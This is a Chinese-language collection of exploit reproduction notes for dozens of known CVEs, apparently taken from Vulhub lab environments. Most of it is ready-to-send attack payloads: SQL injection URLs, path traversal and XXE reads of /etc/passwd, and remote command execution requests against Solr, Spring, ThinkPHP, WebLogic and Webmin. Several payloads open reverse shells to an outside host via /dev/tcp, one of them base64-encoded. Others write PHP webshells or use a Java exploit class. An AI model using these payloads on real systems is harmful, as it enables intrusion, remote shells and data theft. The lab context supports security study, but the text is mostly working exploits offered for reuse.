http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
```
```
http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
```

可见，在执行`))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -和))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`时，返回的HTTP状态码不同


通过改变OR的条件，即可实现SQL BOOL型盲注。

利用这个POC，可以读取管理员的session

# **[mini_httpd任意文件读取漏洞（CVE-2018-18778）](https://vulhub.org/#/environments/mini_httpd/CVE-2018-18778/)**


## **[漏洞复现](https://vulhub.org/#/environments/mini_httpd/CVE-2018-18778/)**


> 发送请求是将Host置空，PATH的值是文件绝对路径：
```
GET /etc/passwd HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```


# **[Mysql 身份认证绕过漏洞（CVE-2012-2122）](https://vulhub.org/#/environments/mysql/CVE-2012-2122/)**

## **[漏洞复现](https://www.freebuf.com/vuls/3815.html)**

`也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。`按照公告说法大约`256次`就能够蒙对一次。而且漏洞利用工具已经出现。 受影响的产品： All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are

> 网上已经出了`metasploit`版本的相应利用工具，下载地址 利用方法如下：
```
https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/mysql/mysql_authbypass_hashdump.rb
```

测试payload:
```
for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; done
mysql>
```

PY脚本：
```
#!/usr/bin/python
import subprocess

while 1:
        subprocess.Popen("mysql -u root mysql --password=blah", shell=True).wait()
```




# **[Nexus Repository Manager 3 远程命令执行漏洞（CVE-2019-7238）](https://vulhub.org/#/environments/nexus/CVE-2019-7238/)**

## **[漏洞复现](http://commons.apache.org/proper/commons-jexl/)**

接口没有校验权限，所以直接发送如下数据包，即可执行`touch /tmp/success`命令：
```
POST /service/extdirect HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 368
Connection: close

{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":
[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/success')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}
```

# **[文件解析漏洞总结-Nginx(CVE-2013-4547)](https://vulhub.org/#/environments/nginx/CVE-2013-4547/)**

## **[漏洞分析](https://blog.werner.wiki/file-resolution-vulnerability-nginx/)**


我的测试环境中，该文件位于`/etc/php5/fpm/php-fpm.conf`。修改该文件中的“security.limit_extensions”，添加上.jpg，添加后如下所示：

```
  security.limit_extensions = .php .jpg
```

这样，php便认为.jpg也是合法的php文件后缀了，


# **[Nginx 解析漏洞复现](https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/)**

# **[Nginx 解析漏洞复现](https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/)**


# **[Node.js 目录穿越漏洞（CVE-2017-14849）](https://vulhub.org/#/environments/node/CVE-2017-14849/)**

## **[漏洞复现]()**

访问`http://your-ip:3000/`即可查看到一个web页面，其中引用到了文件/`static/main.js`，说明其存在静态文件服务器。

发送如下数据包，即可读取passwd：
```
GET /static/../../../a/../../../../etc/passwd HTTP/1.1
Host: your-ip:3000
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

```

# **[node-postgres 代码执行漏洞（CVE-2017-16082）](https://vulhub.org/#/environments/node/CVE-2017-16082/)**


## **[漏洞利用](https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html)**：

```
SELECT 1 AS "\']=0;require=process.mainModule.constructor._load;/*", 2 AS "*/p=require(`child_process`);/*", 3 AS "*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*", 4 AS "*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//"

```

# **[PHP-CGI远程代码执行漏洞（CVE-2012-1823）](https://vulhub.org/#/environments/php/CVE-2012-1823/)**


## **[漏洞原理](https://auth.eindbazen.net/login)**

于是，if(!cgi) getopt(...)被删掉了。

但显然，根据RFC中对于command line的说明，命令行参数不光可以通过`#!/usr/local/bin/php-cgi -d include_path=/path`的方式传入php-cgi，更可以通过querystring的方式传入。

这就是本漏洞的历史成因。

# **[PHP文件包含漏洞（利用phpinfo）](https://vulhub.org/#/environments/php/inclusion/)**

## 


## 漏洞复现

利用脚本`[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)`实现了上述过程，成功包含临时文件后，会执行
```
`<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`
```
，写入一个新的文件/tmp/g，这个文件就会永久留在目标机器上。

用python2执行：

`python exp.py your-ip 8080 100：`


# **[PHP环境 XML外部实体注入漏洞（`XXE`）](https://vulhub.org/#/environments/php/php_xxe/)**


## **漏洞原理**

libxml2.9.0以后，默认不解析外部实体，导致`XXE漏洞`逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。

## **漏洞利用：**

改包变成`POST` 
在body里加入下面的代码：

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>&xxe;</name>
</root>
```

# **[XDebug 远程调试漏洞（代码执行）](https://vulhub.org/#/environments/php/xdebug-rce/)**

## **[漏洞原理]**
我们访问`http://target/index.php?XDEBUG_SESSION_START=phpstorm`，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。


## 漏洞利用

因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。

我编写了一个漏洞复现脚本，`指定目标web地址、待执行的php代码即可`：

```
# 要求用python3并安装requests库
python3 exp.py -t http://127.0.0.1:8080/index.php -c 'shell_exec('id');'
```

# **[PHPMailer 任意文件读取漏洞（CVE-2017-5223）](https://vulhub.org/#/environments/phpmailer/CVE-2017-5223/)**

## **[漏洞原理](https://www.freebuf.com/vuls/124820.html)**


## **[漏洞环境]**

> PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（<img src="...">），并将其src属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用`<img src="/etc/passwd">`将文件/etc/passwd作为附件读取出来，


# **[Shellshock 破壳漏洞（CVE-2014-6271）](https://github.com/vulhub/vulhub/blob/master/bash/shellshock/README.zh-cn.md)**


## **漏洞利用**
将payload附在User-Agent中访问victim.cgi：
```
User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
```

# **[Apache Solr 远程命令执行漏洞（CVE-2017-12629）](https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/)**


## 漏洞复现

首先创建一个listener，其中设置`exe的值为`我们想执行的命令，args的值是命令参数：

```
POST /solr/demo/config HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}
```

> 然后进行update操作，触发刚才添加的listener：
```
POST /solr/demo/update HTTP/1.1
Host: your-ip
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}]
```

# **[Apache Solr 远程命令执行漏洞（CVE-2019-0193）](https://vulhub.org/#/environments/solr/CVE-2019-0193/)**

## 漏洞复现

如上图所示，首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC：
```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

> 点击Execute with this Confuguration会发送以下请求包.

# **[Apache Spark 未授权访问漏洞](https://vulhub.org/#/environments/spark/unacc/)**

## [漏洞利用](https://weibo.com/ttarticle/p/show?id=2309404187794313453016)

## 漏洞复现POC

将其编译成JAR，放在任意一个HTTP或FTP上：

```
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Exploit {
  public static void main(String[] args) throws Exception {
    String[] cmds = args[0].split(",");

    for (String cmd : cmds) {
      System.out.println(cmd);
      System.out.println(executeCommand(cmd.trim()));
      System.out.println("==============================================");
    }
  }

  // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/
  private static String executeCommand(String command) {
    StringBuilder output = new StringBuilder();

    try {
      Process p = Runtime.getRuntime().exec(command);
      p.waitFor();
      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

      String line;
      while ((line = reader.readLine()) != null) {
        output.append(line).append("\n");
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    return output.toString();
  }
}
```
> 返回的包中有submissionId，然后访问`http://your-ip:8081/logPage/?driverId={submissionId}&logType=stdout`，即可查看执行结果.


# ** [Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）](https://vulhub.org/#/environments/spring/CVE-2017-4971/)**

## 漏洞复现

此时抓包，抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）：
```
_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/10.0.0.1/21 0>&1")
```

# **[Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）](https://vulhub.org/#/environments/spring/CVE-2017-8046/)**

## 漏洞复现

> 访问`http://your-ip:8080/customers/1`，看到一个资源。我们使用PATCH请求来`修改之`：
```
PATCH /customers/1 HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]
```

# [**Spring Messaging 远程命令执行漏洞（CVE-2018-1270）**](https://vulhub.org/#/environments/spring/CVE-2018-1270/)

## [漏洞分析](https://xz.aliyun.com/t/2252)

## [漏洞实现](https://cert.360.cn/warning/detail?id=3efa573a1116c8e6eed3b47f78723f12)



# **[Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）](https://vulhub.org/#/environments/spring/CVE-2018-1273/)**


## [漏洞复现](https://xz.aliyun.com/t/2269)

```
POST /users?page=&size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
```

# **[Supervisord 远程命令执行漏洞（CVE-2017-11610）](https://vulhub.org/#/environments/supervisor/CVE-2017-11610/)**

# **[ThinkPHP 2.x 任意代码执行漏洞](https://vulhub.org/#/environments/thinkphp/2-rce/)**


## 漏洞复现

直接访问：
```
http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo()：
```


# **[Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability](https://vulhub.org/#/environments/thinkphp/5-rce/)**


## 漏洞环境

环境启动后，访问`http://your-ip:8080`即可看到ThinkPHP默认启动页面。

## 漏洞复现

直接访问
```
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```
，即可执行phpinfo：


# **[ThinkPHP5 5.0.23 Remote Code Execution Vulnerability](https://vulhub.org/#/environments/thinkphp/5.0.23-rce/)**

## [漏洞复现](https://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md)

发送数据包：
```
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

```

# **[ Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）](https://vulhub.org/#/environments/tomcat/CVE-2017-12615/)**


## **[漏洞原理](https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5)**

任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81）

思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。

payload /
```
PUT /222.jsp/ HTTP/1.1

Host: 10.1.1.6:8080

User-Agent: JNTASS

DNT: 1

Connection: close

...jsp shell...
```


# **[uWSGI PHP Directory Traversal Vulnerability (CVE-2018-7490](https://vulhub.org/#/environments/uwsgi/CVE-2018-7490/)**

## 漏洞复现

```
http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd
```


# [uWSGI 未授权访问漏洞](https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/README.zh-cn.md)


## 漏洞复现

使用[poc.py](https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/poc.py)，执行命令python poc.py -u your-ip:8000 -c "touch /tmp/success"：


# **[Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）](https://vulhub.org/#/environments/weblogic/CVE-2017-10271/)**


> 访问http://your-ip:7001/即可看到一个404页面，说明weblogic已成功启动。

## 漏洞实现

> 写入webshell（访问：`http://your-ip:7001/bea_wls_internal/test.jsp）`：

## 漏洞复现
发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```


# **[Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）](https://vulhub.org/#/environments/weblogic/CVE-2018-2628/)**

## 



# **[Weblogic SSRF漏洞](https://vulhub.org/#/environments/weblogic/ssrf/)**

## 


# Webmin Unauthenticated Remote Code Execution (CVE-2019-15107)

## **[漏洞说明](https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html)**


# **[Webmin 远程命令执行漏洞（CVE-2019-15107）](https://github.com/vulhub/vulhub/blob/master/webmin/CVE-2019-15107/README.zh-cn.md)**


## [漏洞复现](https://www.exploit-db.com/exploits/47230)(https://blog.firosolutions.com/exploits/webmin/)

参考链接中的数据包是不对的，经过阅读代码可知，只有在发送的user参数的值不是已知Linux用户的情况下（而参考链接中是`user=root`），才会进入到修改`/etc/shadow`的地方，`触发命令注入漏洞`。

```
POST /password_change.cgi HTTP/1.1
Host: your-ip:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://your-ip:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```



# **[zabbix latest.php SQL注入漏洞（CVE-2016-10134）](https://vulhub.org/#/environments/zabbix/CVE-2016-10134/)**

## **[漏洞复现]()**

用`账号guest（密码为空）`登录游客账户。

登录后，查看Cookie中的`zbx_sessionid`，`复制后16位字符：`

带入注入：

将这16个字符作为sid的值，访问
```
http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
```

> 这个漏洞也可以通过jsrpc.php触发，且无需登录：
```
http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)：
```

**CVE-2017-7494**

```bash
     use exploit/linux/samba/is_known_pipename
    set rhost <ip>
    set target 3
    run
```